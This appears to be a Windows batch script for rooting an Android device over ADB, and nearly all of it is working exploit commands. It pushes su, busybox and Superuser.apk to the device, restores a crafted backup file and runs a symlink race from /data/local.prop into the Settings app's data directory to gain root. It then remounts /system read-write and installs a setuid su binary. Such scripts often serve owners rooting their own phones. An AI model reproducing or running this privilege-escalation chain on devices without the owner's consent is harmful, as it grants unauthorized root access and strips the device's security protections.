
echo Please connect device with ADB Debugging enabled now....
adb.exe wait-for-device
echo Push busybox
adb.exe push busybox /data/local/tmp/
echo Push su
adb.exe push su /data/local/tmp/
echo Push Superuser,apk
adb.exe push Superuser.apk /data/local/tmp/
echo Applying persmissions to busybox
adb.exe shell chmod 755 /data/local/tmp/busybox
Pause
echo Press [Any Key] key to start initialise restore...
adb.exe restore fakebackup.ab
echo exploit loaded
adb.exe shell "while ! ln -s /data/local.prop /data/data/com.android.settings/a/file99; do :; done" > NUL
echo Please look at your device and click Restore
echo Press [Any Key] to reboot after restore is complete
Pause
echo Successful, going to reboot your device!
adb.exe reboot 
echo Waiting for device to show up again....
adb.exe wait-for-device
echo Mounting System as rw
adb.exe shell "/data/local/tmp/busybox mount -o remount,rw /system"
echo Imaging su binary to /system/xbin
adb.exe shell "dd if=/data/local/tmp/su of=/system/xbin/su"
echo Applying permissions to su
adb.exe shell "chmod 06755 /system/xbin/su"
echo Image Superuser.apk to /system/app/
adb.exe shell "dd if=/data/local/tmp/Superuser.apk of=/system/app/Superuser.apk"
adb.exe shell "chmod 655 /system/app/Superuser.apk"
adb.exe shell "rm /data/local.prop"
adb.exe shell "sync; sync; sync;"
adb.exe reboot
echo After reboot all is done! Have fun with Root!

